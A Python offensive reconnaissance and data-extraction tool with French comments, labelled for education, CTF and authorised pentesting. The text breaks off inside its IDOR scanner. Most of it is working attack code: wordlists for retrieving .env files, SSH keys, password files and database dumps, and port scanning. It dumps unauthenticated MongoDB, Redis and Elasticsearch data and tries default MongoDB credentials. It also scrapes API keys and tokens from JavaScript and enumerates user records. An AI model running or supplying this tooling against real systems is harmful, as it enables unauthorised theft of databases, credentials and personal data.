#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
JATHNIEL-WEB-CRAWLER-PRO v5.1
Crawler + DB Extractor pour CTF / labo / pentest autorise.

Usage educatif uniquement.
"""

import os
import sys
import time
import json
import re
import random
import hashlib
import threading
import queue
import socket
import urllib3
import shutil
import sqlite3
import gzip
import bz2
import lzma
import zipfile
import tarfile
import csv
import subprocess
from datetime import datetime
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, quote
from typing import Dict, List, Tuple, Optional, Any, Set
from collections import deque, defaultdict

import requests
from bs4 import BeautifulSoup
import mimetypes

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ==================== WORDLIST FORCED BROWSING ====================

FORCED_BROWSE_PATHS = [
    "backup.sql", "backup.sqlite", "backup.db", "backup.json",
    "db.sql", "db.sqlite", "db.db", "db.json", "db.dump",
    "database.sql", "database.sqlite", "database.db", "database.json",
    "dump.sql", "dump.sqlite", "dump.db", "dump.json", "dump.rdb",
    "data.sql", "data.sqlite", "data.db", "data.json",
    "export.sql", "export.json", "export.csv", "export.zip",
    "users.sql", "users.db", "users.json", "users.csv",
    "app.sqlite", "app.db", "app.json",
    "site.sql", "site.db", "site.json",
    "mysql.sql", "postgres.sql", "mongodb.archive",
    "schema.sql", "init.sql", "seed.sql",
    "backup.zip", "backup.tar.gz", "site.zip", "www.zip",
    "source.zip", "src.zip", "code.zip", "old.zip",
    "backup_2023.zip", "backup_2024.zip", "backup_2025.zip",
    "backup_2023.sql", "backup_2024.sql", "backup_2025.sql",
    ".env", ".env.local", ".env.prod", ".env.dev",
    ".env.staging", ".env.backup", ".env.example", ".env.bak",
    "config.json", "config.yml", "config.yaml", "config.xml",
    "config.php", "config.js", "config.py",
    "settings.json", "settings.py", "appsettings.json",
    "web.config", "database.yml", "db.php",
    "credentials.json", "secrets.json", "keys.json",
    ".htaccess", ".htpasswd", "php.ini", "nginx.conf",
    "wp-config.php", "wp-config.php.bak",
    ".git/config", ".git/HEAD", ".git/index", ".gitignore",
    ".svn/entries", ".hg/store",
    "admin", "admin/", "admin/index.php", "admin/login",
    "admin/dashboard", "admin/panel", "admin/backup",
    "admin/db", "admin/export", "admin/dump",
    "administrator", "administrator/index.php",
    "login", "login.php", "signin", "panel",
    "dashboard", "cpanel", "webmail",
    "phpmyadmin", "phpmyadmin/", "pma", "pma/",
    "adminer.php", "adminer/",
    "api", "api/", "api/v1", "api/v2",
    "api/admin", "api/users", "api/users.json",
    "api/dump", "api/export", "api/backup", "api/debug",
    "api/v1/users", "api/v1/admin", "api/v1/export",
    "graphql", "graphiql",
    "swagger", "swagger.json", "swagger.yaml",
    "openapi.json", "api-docs",
    "error.log", "access.log", "debug.log", "app.log",
    "logs/error.log", "logs/app.log",
    "debug", "debug.php", "info", "info.php",
    "test", "test.php", "phpinfo.php", "server-status",
    "console", "shell.php",
    "Dockerfile", "docker-compose.yml", "docker-compose.yaml",
    "Jenkinsfile", ".gitlab-ci.yml", ".travis.yml",
    "Makefile", "kubernetes.yml",
    "package.json", "package-lock.json", "yarn.lock",
    "composer.json", "composer.lock", "requirements.txt",
    "Gemfile", "Gemfile.lock", "pom.xml",
    "README.md", "CHANGELOG.md", "LICENSE",
    "robots.txt", "sitemap.xml", "sitemap_index.xml",
    "humans.txt", "security.txt", ".well-known/security.txt",
    "crossdomain.xml", "manifest.json", "favicon.ico",
    "metrics", "actuator", "actuator/health", "actuator/env",
    "old/", "backup/", "backups/", "bak/",
    "private/", "secret/", "secrets/", "internal/",
    "export/", "exports/", "files/", "uploads/",
    "data/", "database/", "db/", "sql/", "dump/",
]

ADMIN_API_ENDPOINTS = [
    "/api/admin/users", "/api/admin/export", "/api/admin/dump",
    "/api/admin/data", "/api/admin/all", "/api/admin/list",
    "/api/admin/backup", "/api/admin/config", "/api/admin/secrets",
    "/api/users", "/api/users/all", "/api/users.json",
    "/api/users?limit=99999", "/api/users?per_page=99999",
    "/api/v1/users", "/api/v1/admin/users", "/api/v1/export",
    "/api/v1/dump", "/api/v1/data", "/api/v2/users",
    "/api/export", "/api/dump", "/api/data", "/api/all",
    "/api/list", "/api/backup", "/api/config", "/api/secrets",
    "/api/debug/users", "/api/debug/db", "/api/debug/config",
    "/admin/export", "/admin/dump", "/admin/data.json",
    "/admin/users.json", "/admin/backup.sql",
    "/export/users", "/export/data", "/export.json",
    "/data.json", "/users.json", "/database.json",
    "/dump.json", "/backup.json", "/all.json",
]

IDOR_PATTERNS = [
    "/api/users/{id}", "/api/user/{id}", "/api/users/{id}/profile",
    "/api/orders/{id}", "/api/order/{id}", "/api/documents/{id}",
    "/api/posts/{id}", "/api/messages/{id}", "/api/items/{id}",
    "/api/v1/users/{id}", "/api/v2/users/{id}",
    "/users/{id}", "/user/{id}", "/profile/{id}", "/account/{id}",
    "/api/accounts/{id}", "/api/profile/{id}",
]

PORTS_TO_SCAN = [
    (27017, "MongoDB"), (6379, "Redis"), (9200, "Elasticsearch"),
    (5432, "PostgreSQL"), (3306, "MySQL"), (11211, "Memcached"),
    (5984, "CouchDB"), (8086, "InfluxDB"), (2379, "etcd"),
    (5601, "Kibana"), (8080, "HTTP-alt"), (8000, "HTTP-alt"),
    (3000, "Node/Dev"), (5000, "Flask/Dev"),
    (15672, "RabbitMQ"), (9092, "Kafka"),
]

WAF_SIGNATURES = {
    'Cloudflare': ['cf-ray', '__cfduid', 'cf-cache-status'],
    'AWS WAF': ['x-amzn-requestid', 'x-amz-cf-id'],
    'ModSecurity': ['mod_security', 'modsecurity'],
    'Imperva': ['incap_ses', 'visid_incap', 'x-iinfo'],
    'Akamai': ['akamai', 'x-akamai'],
    'Sucuri': ['x-sucuri-id', 'x-sucuri-cache'],
    'F5 BIG-IP': ['bigipserver', 'f5-'],
}

MONGO_DEFAULT_CREDS = [
    ("admin", "admin"), ("root", "root"), ("admin", ""), ("root", ""),
    ("admin", "password"), ("admin", "123456"),
]

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/17.0',
]


class JATHNIELCrawlerPro:

    def __init__(self):
        self.config = {
            'max_depth': 3,
            'max_pages': 500,
            'threads': 10,
            'timeout': 30,
            'delay': 0.5,
            'forced_browse_threads': 20,
            'port_scan_threads': 50,
            'user_agent': 'JATHNIEL-Crawler-Pro/5.1 (Educational)',
            'output_dir': './crawled_sites',
            'download_sensitive': True,
            'download_assets': True,
            'respect_robots': True,
            'follow_redirects': True,
            'verify_ssl': False,
            'analyze_db': True,
            'forced_browse': True,
            'check_git': True,
            'check_methods': True,
            'check_headers': True,
            'scan_ports': True,
            'subdomain_enum': True,
            'wayback': True,
            'js_parsing': True,
            'idor_scan': True,
            'api_admin_scan': True,
            'max_idor_ids': 100,
        }

        self.target_url = ""
        self.target_domain = ""
        self.target_host = ""

        self.visited_urls = set()
        self.visited_assets = set()
        self.visited_sensitive = set()
        self._crawled_urls = set()
        self._seed_urls = []
        self._spa_signatures = []
        self.results = self._empty_results()

        self.active_downloads = [0]
        self.download_lock = threading.Lock()
        self.lock = threading.Lock()
        self.scanning = False

        os.makedirs(self.config['output_dir'], exist_ok=True)
        self.error_log_path = os.path.join(self.config['output_dir'], 'errors.log')

        self.sensitive_extensions = [
            '.env', '.env.local', '.env.prod', '.env.backup',
            '.ini', '.conf', '.config', '.cfg', '.yml', '.yaml', '.toml',
            '.sql', '.db', '.sqlite', '.sqlite3', '.db3',
            '.dump', '.bson', '.rdb', '.pgdump',
            '.zip', '.rar', '.7z', '.tar', '.gz',
            '.pem', '.crt', '.cer', '.key', '.p12', '.pfx',
            '.log', '.bin', '.dat',
        ]
        self.sensitive_filenames = [
            'wp-config.php', 'config.php', 'settings.py', 'settings.json',
            'web.config', 'database.yml', 'db.php', '.env',
            'robots.txt', 'sitemap.xml', 'passwd', 'shadow',
            'id_rsa', 'id_ed25519', 'authorized_keys',
            '.bash_history', '.gitconfig', '.htaccess', '.htpasswd',
            'composer.json', 'package.json', 'requirements.txt',
            'Dockerfile', 'docker-compose.yml', 'Makefile', 'Vagrantfile',
            'Jenkinsfile', 'README.md', 'CHANGELOG.md',
        ]
        self.sensitive_directories = [
            '/admin/', '/backup/', '/private/', '/secret/',
            '/config/', '/db/', '/database/', '/sql/', '/dumps/',
            '/.git/', '/.env/', '/logs/', '/tmp/',
            '/api/', '/v1/', '/v2/', '/graphql',
            '/swagger/', '/api-docs/', '/phpmyadmin/',
            '/export/', '/mysql/', '/sqlite/', '/data/',
        ]
        self.tech_patterns = {
            'WordPress': ['wp-content', 'wp-includes', 'wp-json'],
            'Laravel': ['laravel', 'csrf-token'],
            'Django': ['django', 'csrfmiddlewaretoken'],
            'Express': ['express', 'x-powered-by: express'],
            'Flask': ['flask', 'x-powered-by: flask'],
            'React': ['react', 'react-dom'],
            'Vue': ['vue.js', 'vue.min.js'],
            'Angular': ['angular', 'ng-app'],
            'jQuery': ['jquery', 'jquery.min.js'],
            'Cloudflare': ['cf-ray', '__cfduid'],
        }
        self.magic_signatures = {
            b'SQLite format 3\x00': 'sqlite',
            b'PK\x03\x04': 'zip',
            b'\x1f\x8b': 'gzip',
            b'BZh': 'bzip2',
            b'\xfd7zXZ\x00': 'xz',
            b'%PDF-': 'pdf',
            b'\x7fELF': 'elf',
            b'REDIS': 'redis_dump',
            b'BSON': 'bson',
            b'-- MySQL dump': 'mysql_dump',
            b'-- PostgreSQL': 'postgres_dump',
        }
        self.security_headers = {
            'Strict-Transport-Security': 'HSTS manquant',
            'Content-Security-Policy': 'CSP manquant',
            'X-Frame-Options': 'Clickjacking possible',
            'X-Content-Type-Options': 'MIME sniffing possible',
            'Referrer-Policy': 'Referrer leak possible',
        }

        self.clear_screen()
        self.show_banner()

    # ==================== UTILITAIRES ====================

    def _empty_results(self):
        return {
            'pages': [], 'assets': [], 'sensitive_files': [],
            'databases': [], 'db_contents': {},
            'forms': [], 'links': [], 'emails': [],
            'technologies': [], 'admin_pages': [], 'comments': [],
            'forced_browse_hits': [],
            'git_dump': {'exposed': False, 'files': []},
            'env_leaked': {'found': False, 'credentials': []},
            'http_methods': {},
            'security_headers_missing': [],
            'open_ports': [],
            'db_dumps': [],
            'subdomains': [],
            'wayback_urls': [],
            'js_endpoints': [],
            'js_secrets': [],
            'idor_data': [],
            'api_admin_data': [],
            'extracted_users': [],
            'statistics': {
                'total_pages': 0, 'total_assets': 0,
                'total_sensitive': 0, 'total_databases': 0,
                'total_dumps': 0, 'total_size': 0,
                'start_time': None, 'end_time': None, 'duration': 0
            }
        }

    def reset_state(self):
        self.target_url = ""
        self.target_domain = ""
        self.visited_urls = set()
        self.visited_assets = set()
        self.visited_sensitive = set()
        self._crawled_urls = set()
        self._seed_urls = []
        self._spa_signatures = []
        self.results = self._empty_results()
        self.active_downloads = [0]

    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')

    def colorize(self, text, color='white', bold=False):
        colors = {
            'red': '\033[91m', 'green': '\033[92m', 'yellow': '\033[93m',
            'blue': '\033[94m', 'magenta': '\033[95m', 'cyan': '\033[96m',
            'white': '\033[97m', 'bold': '\033[1m', 'end': '\033[0m'
        }
        b = colors['bold'] if bold else ''
        return f"{colors.get(color, '')}{b}{text}{colors['end']}"

    def log_error(self, message):
        try:
            with self.lock:
                with open(self.error_log_path, 'a', encoding='utf-8') as f:
                    f.write(f"[{datetime.now().isoformat()}] {message}\n")
        except Exception:
            pass

    def show_banner(self):
        banner = f"""
{self.colorize('     _   _   _  _____ _   _ _   _ ___ _____ _     ', 'cyan')}
{self.colorize('    | | | | | ||_   _| | | | \\ | |_ _| ____| |    ', 'cyan')}
{self.colorize(' _  | | | | | |  | | | |_| |  \\| || ||  _| | |    ', 'cyan')}
{self.colorize('| |_| | |_| |   | | |  _  | |\\  || || |___| |___ ', 'cyan')}
{self.colorize(' \\___/ \\___/    |_| |_| |_|_| \\_|___|_____|_____|', 'cyan')}
{self.colorize('                                                  ', 'cyan')}
{self.colorize('     WEB CRAWLER + DB EXTRACTOR v5.1', 'green', bold=True)}
{self.colorize('     Usage educatif / CTF / pentest autorise', 'magenta')}
        """
        print(banner)

    def show_menu(self):
        target = self.target_url if self.target_url else self.colorize('Aucune', 'red')
        stats = self.results['statistics']
        print(f"""
{self.colorize('┌──────────────────────────────────────────────────────────────────────────────┐', 'cyan')}
{self.colorize('│', 'cyan')}  {self.colorize('MENU PRINCIPAL - WEB CRAWLER + DB EXTRACTOR v5.1', 'bold')}                  {self.colorize('│', 'cyan')}
{self.colorize('├──────────────────────────────────────────────────────────────────────────────┤', 'cyan')}
{self.colorize('│', 'cyan')}  {self.colorize('1.', 'yellow')}  {self.colorize('Crawl complet (pages + sensibles + DB)', 'white')}              {self.colorize('│', 'cyan')}
{self.colorize('│', 'cyan')}  {self.colorize('2.', 'yellow')}  {self.colorize('Crawl + Forced Browsing + Git + Env', 'white')}              {self.colorize('│', 'cyan')}
{self.colorize('│', 'cyan')}  {self.colorize('3.', 'yellow')}  {self.colorize('RECON COMPLET (tous les modules)', 'white', bold=True)}                 {self.colorize('│', 'cyan')}
{self.colorize('│', 'cyan')}  {self.colorize('4.', 'yellow')}  {self.colorize('Scan de ports uniquement', 'white')}                             {self.colorize('│', 'cyan')}
{self.colorize('│', 'cyan')}  {self.colorize('5.', 'yellow')}  {self.colorize('Subdomain enumeration', 'white')}                                {self.colorize('│', 'cyan')}
{self.colorize('│', 'cyan')}  {self.colorize('6.', 'yellow')}  {self.colorize('Wayback Machine (URLs historiques)', 'white')}                   {self.colorize('│', 'cyan')}
{self.colorize('│', 'cyan')}  {self.colorize('7.', 'yellow')}  {self.colorize('IDOR Scanner (extraction /api/users/1..N)', 'white')}          {self.colorize('│', 'cyan')}
{self.colorize('│', 'cyan')}  {self.colorize('8.', 'yellow')}  {self.colorize('API Admin Discovery', 'white')}                                  {self.colorize('│', 'cyan')}
{self.colorize('│', 'cyan')}  {self.colorize('9.', 'yellow')}  {self.colorize('Changer la cible', 'white')}                                     {self.colorize('│', 'cyan')}
{self.colorize('│', 'cyan')}  {self.colorize('10.', 'yellow')} {self.colorize('Voir les resultats / dumps', 'white')}                          {self.colorize('│', 'cyan')}
{self.colorize('│', 'cyan')}  {self.colorize('11.', 'yellow')} {self.colorize('Exporter (JSON / HTML)', 'white')}                              {self.colorize('│', 'cyan')}
{self.colorize('│', 'cyan')}  {self.colorize('12.', 'yellow')} {self.colorize('Configuration', 'white')}                                        {self.colorize('│', 'cyan')}
{self.colorize('│', 'cyan')}  {self.colorize('0.', 'yellow')}  {self.colorize('Quitter', 'white')}                                              {self.colorize('│', 'cyan')}
{self.colorize('├──────────────────────────────────────────────────────────────────────────────┤', 'cyan')}
{self.colorize('│', 'cyan')}  {self.colorize('Cible:', 'bold')} {target[:66]:<66} {self.colorize('│', 'cyan')}
{self.colorize('│', 'cyan')}  {self.colorize('Stats:', 'bold')} {stats['total_pages']} pages | {stats['total_sensitive']} sensibles | {stats['total_databases']} DB | {stats['total_dumps']} dumps {self.colorize('│', 'cyan')}
{self.colorize('└──────────────────────────────────────────────────────────────────────────────┘', 'cyan')}
        """)

    def get_user_input(self, prompt, default=""):
        p = f"{prompt} [{default}]: " if default else f"{prompt}: "
        return input(self.colorize(p, 'yellow')).strip() or default

    def get_yes_no(self, prompt):
        while True:
            r = input(self.colorize(f"{prompt} (o/n): ", 'yellow')).lower()
            if r in ['o', 'oui', 'y', 'yes']:
                return True
            if r in ['n', 'non', 'no']:
                return False
            print(self.colorize("Repondez par 'o' ou 'n'", 'red'))

    # ==================== SPA / BASELINE ====================

    def detect_spa_and_baseline(self, base_url):
        print(f"\n{self.colorize('[SPA] Detection SPA / baseline 404...', 'cyan')}")
        signatures = []
        for _ in range(3):
            path = f"/this-not-exist-{random.randint(100000, 999999)}"
            try:
                r = requests.get(base_url.rstrip('/') + path,
                                 headers={'User-Agent': self.config['user_agent']},
                                 timeout=10, verify=self.config['verify_ssl'])
                signatures.append({
                    'status': r.status_code,
                    'size': len(r.content),
                    'hash': hashlib.md5(r.content).hexdigest(),
                })
            except Exception:
                pass

        if not signatures:
            return {'is_spa': False, 'signatures': []}

        hashes = set(s['hash'] for s in signatures)
        is_spa = len(hashes) == 1 and len(signatures) >= 2

        if is_spa:
            print(f"  {self.colorize('SPA detectee - filtrage des faux positifs actif', 'yellow')}")
        else:
            print(f"  {self.colorize('Pas de SPA', 'green')}")

        self._spa_signatures = signatures
        return {'is_spa': is_spa, 'signatures': signatures}

    def _is_false_positive(self, content_head: bytes) -> bool:
        is_html = (
            content_head.startswith(b'<!DOCTYPE html') or
            content_head.startswith(b'<html') or
            b'<!doctype html' in content_head[:500].lower() or
            b'<div id="app"' in content_head[:2000] or
            b'<div id="root"' in content_head[:2000] or
            b'<div id="__next"' in content_head[:2000]
        )
        is_spa_match = False
        if self._spa_signatures:
            h = hashlib.md5(content_head).hexdigest()
            is_spa_match = any(h == s['hash'] for s in self._spa_signatures)
        return is_html or is_spa_match

    # ==================== SCAN PORTS ====================

    def scan_ports(self, host):
        print(f"\n{self.colorize('[PORTS] SCAN DE PORTS', 'cyan', bold=True)}")
        print(f"  Host : {host}")
        print(f"  Ports: {len(PORTS_TO_SCAN)}")
        print(self.colorize("=" * 70, 'blue'))

        open_ports = []
        lock = threading.Lock()
        q = queue.Queue()

        for port, service in PORTS_TO_SCAN:
            q.put((port, service))

        def worker():
            while True:
                try:
                    port, service = q.get(timeout=2)
                except queue.Empty:
                    return
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(3)
                    result = s.connect_ex((host, port))
                    s.close()
                    if result == 0:
                        with lock:
                            open_ports.append((port, service))
                        print(f"  {self.colorize('[OUVERT]', 'red', bold=True)} {service} sur {host}:{port}")
                except Exception:
                    pass
                finally:
                    q.task_done()

        threads = []
        for _ in range(self.config['port_scan_threads']):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            threads.append(t)
        for t in threads:
            t.join(timeout=30)

        self.results['open_ports'] = [{'port': p, 'service': s} for p, s in open_ports]
        print(f"\n  {self.colorize('[OK]', 'green')} {len(open_ports)} port(s) ouvert(s)")
        return open_ports

    # ==================== EXPLOIT MONGODB ====================

    def exploit_mongodb(self, host, port=27017):
        print(f"\n{self.colorize('[MONGO] Extraction MongoDB', 'magenta', bold=True)}")
        print(f"  Cible: {host}:{port}")

        try:
            from pymongo import MongoClient
        except ImportError:
            print(f"  {self.colorize('[!] pymongo non installe', 'yellow')}")
            print(f"     -> pip install pymongo")
            return self._exploit_mongodb_mongosh(host, port)

        # Sans auth
        try:
            client = MongoClient(f'mongodb://{host}:{port}/', serverSelectionTimeoutMS=5000)
            dbs = client.list_database_names()
            print(f"  {self.colorize('[!!] MongoDB SANS AUTH !', 'red', bold=True)}")
            print(f"  {len(dbs)} base(s) accessible(s)")
            self._extract_mongodb_databases(client, dbs)
            client.close()
            return True
        except Exception as e:
            print(f"  [!] Auth requise: {str(e)[:80]}")

        # Creds par defaut
        for user, pwd in MONGO_DEFAULT_CREDS:
            try:
                uri = f'mongodb://{user}:{pwd}@{host}:{port}/?authSource=admin'
                client = MongoClient(uri, serverSelectionTimeoutMS=3000)
                dbs = client.list_database_names()
                print(f"  {self.colorize('[!!] CREDS TROUVES', 'red', bold=True)} : {user}:{pwd}")
                self._extract_mongodb_databases(client, dbs)
                client.close()
                return True
            except Exception:
                pass

        print(f"  [X] MongoDB protege (auth OK)")
        return False

    def _extract_mongodb_databases(self, client, dbs):
        skip_dbs = ['admin', 'local', 'config']
        total_docs = 0
        for db_name in dbs:
            if db_name in skip_dbs:
                continue
            try:
                db = client[db_name]
                collections = db.list_collection_names()
                if not collections:
                    continue
                print(f"  [DB] {self.colorize(db_name, 'cyan', bold=True)} ({len(collections)} collections)")
                db_dump = {'db': db_name, 'collections': {}}
                for coll_name in collections:
                    try:
                        docs = list(db[coll_name].find().limit(5000))
                        for d in docs:
                            for k, v in list(d.items()):
                                if hasattr(v, '__str__') and not isinstance(
                                    v, (str, int, float, bool, type(None), list, dict)):
                                    d[k] = str(v)
                        db_dump['collections'][coll_name] = docs
                        total_docs += len(docs)
                        print(f"    [DOC] {coll_name}: {len(docs)} documents")
                    except Exception as e:
                        print(f"    [X] {coll_name}: {str(e)[:50]}")
                self.results['db_dumps'].append(db_dump)
                self.results['statistics']['total_dumps'] += 1
                self._harvest_users_from_dump(db_dump)
            except Exception as e:
                print(f"  [X] DB {db_name}: {str(e)[:60]}")
        print(f"\n  {self.colorize('[OK]', 'green')} Total: {total_docs} documents extraits")

    def _exploit_mongodb_mongosh(self, host, port):
        if not (shutil.which('mongosh') or shutil.which('mongo')):
            print(f"  [X] Ni pymongo ni mongosh disponibles")
            return False
        shell = 'mongosh' if shutil.which('mongosh') else 'mongo'
        try:
            result = subprocess.run(
                [shell, f'mongodb://{host}:{port}/', '--quiet', '--eval',
                 'JSON.stringify(db.adminCommand({listDatabases:1}))'],
                capture_output=True, text=True, timeout=15)
            if result.returncode == 0 and 'databases' in result.stdout:
                print(f"  {self.colorize('[!!] MongoDB SANS AUTH !', 'red', bold=True)}")
                print(f"  {result.stdout[:500]}")
                return True
        except Exception as e:
            print(f"  [X] {str(e)[:60]}")
        return False

    # ==================== EXPLOIT REDIS ====================

    def exploit_redis(self, host, port=6379):
        print(f"\n{self.colorize('[REDIS] Extraction Redis', 'magenta', bold=True)}")
        print(f"  Cible: {host}:{port}")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((host, port))
            s.send(b'PING\r\n')
            resp = s.recv(100)
            if b'PONG' not in resp:
                print(f"  [X] Redis ne repond pas au PING")
                s.close()
                return False
            print(f"  {self.colorize('[!!] Redis SANS AUTH !', 'red', bold=True)}")
            s.send(b'KEYS *\r\n')
            time.sleep(0.5)
            keys_data = s.recv(50000)
            keys = keys_data.decode(errors='ignore').split('\r\n')
            keys = [k.strip() for k in keys if k.strip() and not k.startswith('*')]
            print(f"  [KEYS] {len(keys)} cle(s) trouvee(s)")
            redis_dump = {'host': f'{host}:{port}', 'keys': {}}
            for key in keys[:500]:
                try:
                    s.send(f'TYPE {key}\r\n'.encode())
                    time.sleep(0.05)
                    ktype = s.recv(200).decode(errors='ignore').strip()
                    s.send(f'GET {key}\r\n'.encode())
                    time.sleep(0.05)
                    val = s.recv(10000).decode(errors='ignore').strip()
                    redis_dump['keys'][key] = {'type': ktype, 'value': val[:2000]}
                    print(f"    [KEY] {key} = {val[:80]}")
                except Exception:
                    pass
            self.results['db_dumps'].append(redis_dump)
            self.results['statistics']['total_dumps'] += 1
            s.close()
            return True
        except Exception as e:
            print(f"  [X] {str(e)[:60]}")
            return False

    # ==================== EXPLOIT ELASTICSEARCH ====================

    def exploit_elasticsearch(self, host, port=9200):
        print(f"\n{self.colorize('[ES] Extraction Elasticsearch', 'magenta', bold=True)}")
        print(f"  Cible: {host}:{port}")
        try:
            r = requests.get(f'http://{host}:{port}/_cat/indices?format=json', timeout=10)
            if r.status_code != 200:
                print(f"  [X] HTTP {r.status_code}")
                return False
            indices = r.json()
            print(f"  {self.colorize('[!!] Elasticsearch SANS AUTH !', 'red', bold=True)}")
            print(f"  [IDX] {len(indices)} index")
            es_dump = {'host': f'{host}:{port}', 'indices': {}}
            for idx in indices:
                idx_name = idx.get('index', '')
                if idx_name.startswith('.'):
                    continue
                try:
                    r2 = requests.get(f'http://{host}:{port}/{idx_name}/_search?size=100', timeout=15)
                    if r2.status_code == 200:
                        data = r2.json()
                        hits = data.get('hits', {}).get('hits', [])
                        es_dump['indices'][idx_name] = [h.get('_source') for h in hits]
                        print(f"    [IDX] {idx_name}: {len(hits)} docs")
                except Exception:
                    pass
            self.results['db_dumps'].append(es_dump)
            self.results['statistics']['total_dumps'] += 1
            return True
        except Exception as e:
            print(f"  [X] {str(e)[:60]}")
            return False

    # ==================== SUBDOMAIN ENUM ====================

    def subdomain_enum(self, domain):
        print(f"\n{self.colorize('[SUB] Subdomain Enumeration', 'cyan', bold=True)}")
        print(f"  Domaine: {domain}")
        subdomains = set()
        common_subs = [
            'www', 'mail', 'admin', 'api', 'dev', 'staging', 'test', 'demo',
            'app', 'portal', 'blog', 'shop', 'cdn', 'static',
            'db', 'database', 'mysql', 'postgres', 'mongo', 'redis',
            'git', 'gitlab', 'jenkins', 'ci', 'build',
            'internal', 'intranet', 'vpn', 'remote', 'ftp',
            'docs', 'wiki', 'confluence', 'jira', 'support', 'help',
            'auth', 'sso', 'login', 'account', 'dashboard',
            'beta', 'alpha', 'preview', 'stage', 'preprod', 'production',
            'backend', 'frontend', 'node', 'python', 'php',
            'old', 'new', 'v1', 'v2', 'mobile', 'm',
            'monitor', 'status', 'health', 'metrics', 'grafana', 'kibana',
            'backup', 'files', 'storage', 'uploads', 'assets',
            'webmail', 'smtp', 'pop', 'imap', 'mx', 'ns1', 'ns2',
        ]

        def check_sub(sub):
            fqdn = f"{sub}.{domain}"
            try:
                ip = socket.gethostbyname(fqdn)
                return (fqdn, ip)
            except socket.gaierror:
                return None

        def worker():
            while True:
                try:
                    sub = q.get(timeout=1)
                except queue.Empty:
                    return
                try:
                    result = check_sub(sub)
                    if result:
                        with self.lock:
                            subdomains.add(result[0])
                        print(f"  [FOUND] {result[0]} -> {result[1]}")
                finally:
                    q.task_done()

        q = queue.Queue()
        for s in common_subs:
            q.put(s)
        threads = [threading.Thread(target=worker, daemon=True) for _ in range(20)]
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=30)

        # crt.sh
        try:
            r = requests.get(f'https://crt.sh/?q=%25.{domain}&output=json', timeout=15)
            if r.status_code == 200:
                entries = r.json()
                for e in entries[:500]:
                    name = e.get('name_value', '')
                    for n in name.split('\n'):
                        n = n.strip().lower()
                        if (n.endswith(f'.{domain}') or n == domain) and '*' not in n:
                            if n not in subdomains:
                                subdomains.add(n)
                                print(f"  [crt.sh] {n}")
        except Exception as e:
            self.log_error(f"crt.sh: {e}")

        self.results['subdomains'] = sorted(subdomains)
        print(f"\n  {self.colorize('[OK]', 'green')} {len(subdomains)} sous-domaine(s)")
        return list(subdomains)

    # ==================== WAYBACK ====================

    def wayback_machine(self, domain):
        print(f"\n{self.colorize('[WAYBACK] Wayback Machine', 'cyan', bold=True)}")
        print(f"  Domaine: {domain}")
        try:
            url = f"http://web.archive.org/cdx/search/cdx?url={domain}/*&output=json&limit=1000&collapse=urlkey"
            r = requests.get(url, timeout=30)
            if r.status_code != 200:
                print(f"  [X] HTTP {r.status_code}")
                return []
            data = r.json()
            urls = []
            if len(data) > 1:
                for row in data[1:]:
                    if len(row) >= 3:
                        urls.append(row[2])
            urls = list(set(urls))
            self.results['wayback_urls'] = urls[:500]
            print(f"  [OK] {len(urls)} URL(s) historiques")
            for u in urls[:20]:
                if any(x in u.lower() for x in ['admin', 'backup', 'dump', 'export',
                                                 '.sql', '.env', 'api', 'config',
                                                 'old', '.git', '.bak']):
                    print(f"    [HIT] {u}")
            return urls
        except Exception as e:
            print(f"  [X] {str(e)[:80]}")
            return []

    # ==================== JS PARSING ====================

    def parse_js_deep(self):
        print(f"\n{self.colorize('[JS] JS Parsing Approfondi', 'cyan', bold=True)}")
        endpoints = set()
        secrets = set()
        endpoint_patterns = [
            r'["\'](/api/[a-zA-Z0-9_\-/{}\.]+)["\']',
            r'["\'](/v[0-9]+/[a-zA-Z0-9_\-/{}\.]+)["\']',
            r'["\'](/internal/[a-zA-Z0-9_\-/]+)["\']',
            r'["\'](/admin/[a-zA-Z0-9_\-/]+)["\']',
            r'(?:fetch|axios\.(?:get|post|put|delete))\s*\(\s*["\']([^"\']+)["\']',
            r'url\s*:\s*["\']([^"\']+)["\']',
        ]
        secret_patterns = {
            'aws_key': r'AKIA[0-9A-Z]{16}',
            'google_api': r'AIza[0-9A-Za-z\-_]{35}',
            'stripe_key': r'sk_live_[a-zA-Z0-9]{24,}',
            'github_token': r'ghp_[a-zA-Z0-9]{36}',
            'jwt': r'eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+',
            'mongo_uri': r'mongodb(?:\+srv)?://[^\s"\'<>]+',
            'postgres_uri': r'postgres(?:ql)?://[^\s"\'<>]+',
            'mysql_uri': r'mysql://[^\s"\'<>]+',
        }
        js_files = [a for a in self.results['assets']
                    if a.get('filename', '').endswith('.js')]
        for js in js_files:
            try:
                path = js.get('path') or os.path.join(
                    f"{self.config['output_dir']}/{self.target_domain}/assets",
                    js['filename'])
                with open(path, 'r', errors='ignore') as f:
                    content = f.read()
                for pat in endpoint_patterns:
                    for m in re.findall(pat, content):
                        if m.startswith('/') and len(m) > 3:
                            endpoints.add(m)
                for name, pat in secret_patterns.items():
                    for m in re.findall(pat, content):
                        secrets.add((name, m[:200]))
            except Exception:
                pass
        self.results['js_endpoints'] = sorted(endpoints)
        self.results['js_secrets'] = [{'type': t, 'value': v} for t, v in secrets]
        print(f"  [EP] {len(endpoints)} endpoint(s) trouve(s)")
        for ep in sorted(endpoints)[:20]:
            print(f"    [EP] {ep}")
        if secrets:
            print(f"  [KEY] {len(secrets)} secret(s)")
            for t, v in secrets:
                print(f"    [{t}] {v[:80]}")
        return endpoints

    # ==================== IDOR ====================

    def idor_scan(self):
        print(f"\n{self.colorize('[IDOR] IDOR Scanner', 'cyan', bold=True)}")
        base = self.target_url.rstrip('/')
        for pattern in IDOR_PATTERNS:
            print(f"\n  Test pattern: {pattern}")
            extracted = []
